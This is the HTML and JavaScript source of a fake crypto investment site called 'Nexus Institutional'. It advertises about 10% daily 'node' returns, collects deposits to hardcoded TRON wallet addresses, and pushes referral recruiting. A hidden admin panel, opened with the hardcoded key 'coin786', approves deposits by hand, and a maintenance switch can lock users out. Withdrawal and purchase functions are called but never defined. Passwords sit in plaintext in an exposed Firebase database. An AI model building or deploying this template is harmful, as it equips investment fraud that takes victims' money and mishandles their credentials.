<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INSTITUTIONAL | Asset Management Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap');
        :root { --primary: #1a1a1a; --accent: #2563eb; --success: #059669; --error: #dc2626; }
        body { background: #f9fafb; color: #111827; font-family: 'Inter', sans-serif; margin: 0; }
        
        .card-pro { background: #ffffff; border: 1px solid #e5e7eb; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
        .btn-primary { background: var(--primary); color: #fff; border-radius: 8px; font-weight: 600; padding: 12px; transition: 0.2s; border: none; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
        .btn-primary:hover { opacity: 0.9; }
        .input-pro { background: #fff; border: 1px solid #d1d5db; border-radius: 8px; padding: 14px; width: 100%; outline: none; transition: 0.2s; font-size: 13px; }
        .input-pro:focus { border-color: var(--accent); }
        
        .status-pending { color: #d97706; background: #fef3c7; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 700; text-transform: uppercase; }
        .status-approved { color: #059669; background: #dcfce7; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 700; text-transform: uppercase; }
        .status-rejected { color: #dc2626; background: #fee2e2; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 700; text-transform: uppercase; }

        .nav-item { color: #6b7280; font-size: 10px; font-weight: 600; text-align: center; cursor: pointer; transition: 0.2s; }
        .nav-active { color: var(--accent); }
        
        .hidden { display: none !important; }
        #maintenance-screen { position: fixed; inset: 0; background: #fff; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .page-transition { animation: fadeIn 0.3s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="maintenance-screen" class="hidden">
        <div class="w-12 h-12 border-4 border-slate-200 border-t-blue-600 rounded-full animate-spin"></div>
        <h2 class="mt-6 text-lg font-bold text-slate-800">System Optimization</h2>
        <p class="text-slate-500 text-xs mt-2 px-6 italic">Our infrastructure nodes are currently undergoing a scheduled protocol upgrade.</p>
    </div>

    <div id="auth-ui" class="min-h-screen flex items-center justify-center p-6 bg-slate-50">
        <div class="max-w-md w-full">
            <div class="text-center mb-10">
                <h1 class="text-2xl font-extrabold tracking-tighter text-slate-900 uppercase">Nexus<span class="text-blue-600">Institutional</span></h1>
                <p class="text-[9px] text-slate-400 font-bold uppercase tracking-[4px] mt-2 italic">Global Node Access Protocol</p>
            </div>

            <div id="login-box" class="card-pro p-8 space-y-4 shadow-xl">
                <h2 class="text-[10px] font-black uppercase text-slate-400 tracking-widest">Secure Login</h2>
                <input type="text" id="l-user" placeholder="Account Identifier" class="input-pro">
                <input type="password" id="l-pass" placeholder="Security Key" class="input-pro">
                <button onclick="handleLogin()" class="btn-primary">Authenticate Terminal</button>
                <p class="text-center text-xs font-semibold text-slate-500 mt-4">Unauthorized access prohibited. <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer">Register New ID</span></p>
            </div>

            <div id="signup-box" class="card-pro p-8 space-y-4 hidden shadow-xl border-t-4 border-blue-600">
                <h2 class="text-[10px] font-black uppercase text-slate-400 tracking-widest">Protocol Registration</h2>
                <input type="text" id="s-user" placeholder="Create Identity" class="input-pro">
                <input type="password" id="s-pass" placeholder="Set Security Key" class="input-pro">
                <input type="text" id="s-ref" placeholder="Referral ID (Optional)" class="input-pro">
                <button onclick="handleSignup()" class="btn-primary">Initialize Sync</button>
                <p class="text-center text-xs font-semibold text-slate-500 mt-4">Existing credentials? <span onclick="toggleAuth(false)" class="text-blue-600 cursor-pointer">Return to Login</span></p>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pb-24">
        <header class="bg-white/80 backdrop-blur-md border-b border-slate-200 p-4 sticky top-0 z-50 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-9 h-9 bg-slate-900 text-white rounded-lg flex items-center justify-center font-bold italic">N</div>
                <div>
                    <p id="nav-user" class="text-xs font-black text-slate-900 uppercase">User: ---</p>
                    <p class="text-[9px] font-bold text-emerald-600 uppercase tracking-tighter">Status: Protected</p>
                </div>
            </div>
            <div class="flex gap-4 items-center">
                <a href="https://t.me/your_telegram_channel" target="_blank" class="text-blue-500 text-lg"><i class="fa-brands fa-telegram"></i></a>
                <button onclick="logout()" class="text-slate-400"><i class="fa-solid fa-power-off"></i></button>
            </div>
        </header>

        <main id="page-home" class="p-4 space-y-4 page-transition">
            <div class="card-pro p-6 bg-gradient-to-br from-slate-900 to-slate-800 text-white border-none shadow-lg">
                <p class="text-[10px] font-bold uppercase text-slate-400 tracking-wider">Total Institutional Equity</p>
                <h2 id="balance-txt" class="text-3xl font-bold mt-1 tracking-tight">$0.00</h2>
                <div class="mt-8 flex justify-between border-t border-slate-700 pt-5">
                    <div>
                        <p class="text-[9px] font-bold text-slate-500 uppercase italic">Real-Time Yield</p>
                        <p id="profit-txt" class="text-xl font-bold text-emerald-400">+$0.00</p>
                    </div>
                    <button onclick="copyRef()" class="bg-blue-600 text-white px-5 py-2 rounded-lg text-[9px] font-bold uppercase italic shadow-lg shadow-blue-500/20">Invite Capital</button>
                </div>
            </div>
            
            <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-[2px] px-1 pt-4">Operational Nodes</h3>
            <div id="active-nodes-list" class="space-y-3"></div>
        </main>

        <main id="page-market" class="p-4 space-y-6 hidden page-transition">
            <h3 class="text-sm font-black text-slate-900 uppercase border-l-4 border-blue-600 pl-3">Sovereign High-Yield</h3>
            <div id="elite-nodes" class="grid gap-4"></div>
            <h3 class="text-sm font-black text-slate-900 uppercase border-l-4 border-slate-300 pl-3 pt-6">Institutional Standard</h3>
            <div id="normal-nodes" class="grid gap-4"></div>
        </main>

        <main id="page-history" class="p-4 space-y-4 hidden page-transition">
            <h3 class="text-sm font-black text-slate-900 uppercase">Account Ledger</h3>
            <div id="history-list" class="space-y-2"></div>
        </main>

        <main id="page-info" class="p-4 space-y-4 hidden page-transition">
            <div class="card-pro p-5">
                <h3 class="text-xs font-bold text-slate-900 uppercase mb-2">Institutional Support</h3>
                <p class="text-xs text-slate-500 mb-4">Join our official channel for real-time node performance and protocol updates.</p>
                <a href="https://t.me/your_telegram_channel" target="_blank" class="btn-primary inline-block text-center !bg-[#24A1DE] !w-auto px-6">Official Telegram Channel</a>
            </div>
            <div class="card-pro p-5">
                <h3 class="text-xs font-bold text-slate-900 uppercase mb-3">FAQ & Protocol</h3>
                <div class="space-y-4">
                    <details class="text-xs">
                        <summary class="font-bold cursor-pointer text-slate-700">Yield Liquidation Terms</summary>
                        <p class="pt-2 text-slate-500 leading-relaxed">Profits are calculated every 24-hour cycle. Capital withdrawals are subject to terminal audit to prevent protocol instability.</p>
                    </details>
                    <hr class="border-slate-100">
                    <details class="text-xs">
                        <summary class="font-bold cursor-pointer text-slate-700">Infrastructure Privacy</summary>
                        <p class="pt-2 text-slate-500 leading-relaxed">All transaction hashes are end-to-end encrypted. Nexus Institutional does not share user terminal data with third-party providers.</p>
                    </details>
                </div>
            </div>
        </main>

        <main id="page-vault" class="p-4 space-y-4 hidden page-transition">
            <div class="card-pro p-6 space-y-4">
                <h3 class="text-sm font-bold uppercase text-slate-900">Capital Injection</h3>
                <select id="dep-method" class="input-pro font-bold" onchange="updateDepUI()">
                    <option value="">Choose Protocol</option>
                    <option value="USDT_TRC20">USDT (TRC20)</option>
                    <option value="TRX">TRX (TRON)</option>
                </select>
                <div id="dep-details" class="hidden space-y-4 border-t pt-4">
                    <div class="bg-slate-50 p-4 rounded-lg text-center border border-slate-200">
                        <p id="dep-addr" class="text-[11px] font-mono font-black text-blue-600 break-all select-all"></p>
                    </div>
                    <input type="number" id="dep-amt" placeholder="Asset Amount ($)" class="input-pro">
                    <input type="text" id="dep-tid" placeholder="Transaction ID (TID)" class="input-pro">
                    <input type="file" id="dep-proof" class="text-[10px] font-bold">
                    <button onclick="submitDeposit()" class="btn-primary">Finalize Settlement</button>
                </div>
            </div>

            <div class="card-pro p-6 space-y-4">
                <h3 class="text-sm font-bold uppercase text-slate-900">Capital Payout</h3>
                <input type="number" id="w-amt" placeholder="Amount ($)" class="input-pro">
                <input type="text" id="w-addr" placeholder="Destination Hash" class="input-pro">
                <button onclick="submitWithdrawal()" class="btn-primary" style="background:#475569">Execute Withdrawal</button>
            </div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 bg-white/90 backdrop-blur-xl border-t border-slate-200 p-4 flex justify-around items-center z-50">
            <div onclick="switchPage('home')" class="nav-item nav-active"><i class="fa-solid fa-home text-lg"></i><p>Terminal</p></div>
            <div onclick="switchPage('market')" class="nav-item"><i class="fa-solid fa-server text-lg"></i><p>Market</p></div>
            <div onclick="switchPage('history')" class="nav-item"><i class="fa-solid fa-file-invoice text-lg"></i><p>Ledger</p></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-shield-halved text-lg"></i><p>Vault</p></div>
            <div onclick="switchPage('info')" class="nav-item"><i class="fa-solid fa-circle-info text-lg"></i><p>Info</p></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-slate-50 z-[10000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b pb-4">
            <h2 class="text-sm font-black text-slate-900 uppercase">Global Admin Infrastructure</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-3xl text-slate-400">&times;</button>
        </div>
        <button id="m-btn" onclick="toggleMaintenance()" class="btn-primary mb-6">Maintenance Mode: OFF</button>
        <div id="admin-requests" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const nodeData = {
            elite: [
                { id: 201, name: "Sovereign Tier-1", price: 2500, daily: 250, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=300" },
                { id: 202, name: "Sovereign Tier-2", price: 5000, daily: 550, img: "https://images.unsplash.com/photo-1644088379091-d574269d422f?w=300" }
            ],
            retail: Array.from({length: 6}, (_, i) => ({
                id: i+1, name: `Node Protocol v${i+1}`, price: 100 + (i*150), daily: 10 + (i*12), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=300&sig=${i}`
            }))
        };

        window.onload = () => {
            renderMarket();
            checkSystemState();
            const u = localStorage.getItem('nexus_user');
            if(u) showDashboard(u);
        };

        function renderMarket() {
            document.getElementById('elite-nodes').innerHTML = nodeData.elite.map(p => nodeItem(p, true)).join('');
            document.getElementById('normal-nodes').innerHTML = nodeData.retail.map(p => nodeItem(p, false)).join('');
        }

        const nodeItem = (p, elite) => `
            <div class="card-pro overflow-hidden flex items-center h-24">
                <img src="${p.img}" class="w-24 h-24 object-cover ${elite ? 'brightness-75' : ''}">
                <div class="px-4 flex-1">
                    <h4 class="text-[10px] font-black uppercase tracking-tight">${p.name}</h4>
                    <p class="text-[10px] font-bold text-emerald-600 mt-1">24H Return: $${p.daily}</p>
                    <div class="flex justify-between items-center mt-2">
                        <span class="text-sm font-black">$${p.price}</span>
                        <button onclick="purchaseNode(${p.id})" class="bg-slate-900 text-white text-[8px] font-black px-4 py-1.5 rounded-md uppercase tracking-widest">Deploy</button>
                    </div>
                </div>
            </div>`;

        // DASHBOARD SYSTEM
        function showDashboard(uid) {
            document.getElementById('auth-ui').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = `ID: ${uid}`;
            
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toFixed(2);
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toFixed(2);
                
                const nodes = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-nodes-list').innerHTML = nodes.map(([k, n]) => `
                    <div class="card-pro p-4 flex justify-between items-center border-l-4 border-blue-600">
                        <div><p class="text-[10px] font-black uppercase italic">${n.name}</p><p class="text-[9px] text-slate-400 font-bold uppercase mt-1">Status: Computing</p></div>
                        <div class="text-right">
                            <span class="text-xs font-mono font-bold bg-slate-100 px-3 py-1 rounded-lg countdown" data-next="${n.nextClaim}">00:00:00</span>
                        </div>
                    </div>`).join('') || '<div class="text-center py-10 text-[10px] font-bold text-slate-300 uppercase tracking-widest">No Active Nodes</div>';

                const history = d.history ? Object.entries(d.history).reverse() : [];
                document.getElementById('history-list').innerHTML = history.map(([k, h]) => `
                    <div class="card-pro p-3 flex justify-between items-center">
                        <div><p class="text-[10px] font-black uppercase italic">${h.type}</p><p class="text-[9px] text-slate-400 font-bold mt-1">${h.date}</p></div>
                        <div class="text-right"><p class="text-xs font-bold text-slate-900">$${h.amount}</p><span class="status-${h.status.toLowerCase()}">${h.status}</span></div>
                    </div>`).join('') || '<div class="text-center py-10 text-[10px] font-bold text-slate-300 uppercase italic tracking-widest">Ledger Clear</div>';
            });
        }

        // ASSET TRANSFER (Base64)
        window.submitDeposit = () => {
            const file = document.getElementById('dep-proof').files[0];
            const reader = new FileReader();
            if(!file) return alert("Proof required.");
            reader.readAsDataURL(file);
            reader.onload = async () => {
                const uid = localStorage.getItem('nexus_user'), hKey = push(ref(db, 'admin/requests')).key;
                const req = { id: hKey, user: uid, amount: document.getElementById('dep-amt').value, tid: document.getElementById('dep-tid').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() };
                await set(ref(db, `admin/requests/${hKey}`), req);
                await set(ref(db, `users/${uid}/history/${hKey}`), req);
                alert("Audit Initiated. Status will update in Ledger.");
                switchPage('history');
            };
        };

        // ADMIN TERMINAL
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Auth Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };

        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.values(d).map(r => `
                    <div class="card-pro p-4 space-y-4">
                        <div class="flex justify-between font-black text-[10px] uppercase"><span>${r.type} [${r.user}]</span><span>$${r.amount}</span></div>
                        ${r.proof ? `<img src="${r.proof}" class="w-full h-40 object-cover rounded-lg shadow-inner">` : ''}
                        <div class="flex gap-2">
                            <button onclick="auditReq('${r.id}','${r.user}',${r.amount},'Approved')" class="btn-primary !bg-emerald-600 flex-1">Approve</button>
                            <button onclick="auditReq('${r.id}','${r.user}',${r.amount},'Rejected')" class="btn-primary !bg-rose-600 flex-1">Reject</button>
                        </div>
                    </div>`).join('') : '';
            });
        }

        window.auditReq = async (id, user, amt, status) => {
            if(status === 'Approved') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            }
            await update(ref(db, `users/${user}/history/${id}`), { status });
            await remove(ref(db, 'admin/requests/' + id));
        };

        // CORE UTILS
        window.switchPage = (p) => { ['home','market','history','vault','info'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active')); event.currentTarget.classList.add('nav-active'); };
        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value; if(!u || !p) return; const s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Access Denied."); };
        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value; if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 }); toggleAuth(false); } };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.updateDepUI = () => { const m = document.getElementById('dep-method').value; document.getElementById('dep-addr').innerText = m === 'USDT_TRC20' ? 'TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ' : 'TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76'; document.getElementById('dep-details').classList.remove('hidden'); };
        window.checkSystemState = () => onValue(ref(db, 'system/maintenance'), (s) => { document.getElementById('maintenance-screen').classList.toggle('hidden', !s.val()); document.getElementById('m-btn').innerText = s.val() ? "MAINTENANCE: ON" : "MAINTENANCE: OFF"; });
        window.toggleMaintenance = async () => { const s = await get(ref(db, 'system/maintenance')); await set(ref(db, 'system/maintenance'), !s.val()); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.copyRef = () => { navigator.clipboard.writeText(window.location.href + "?id=" + localStorage.getItem('nexus_user')); alert("Referral Protocol Link Copied."); };

        // REAL-TIME YIELD CLOCK
        setInterval(() => {
            document.querySelectorAll('.countdown').forEach(el => {
                const diff = parseInt(el.dataset.next) - Date.now();
                if(diff > 0) {
                    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                    el.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
                } else el.innerText = "Syncing Yield...";
            });
        }, 1000);
    </script>
</body>
</html>
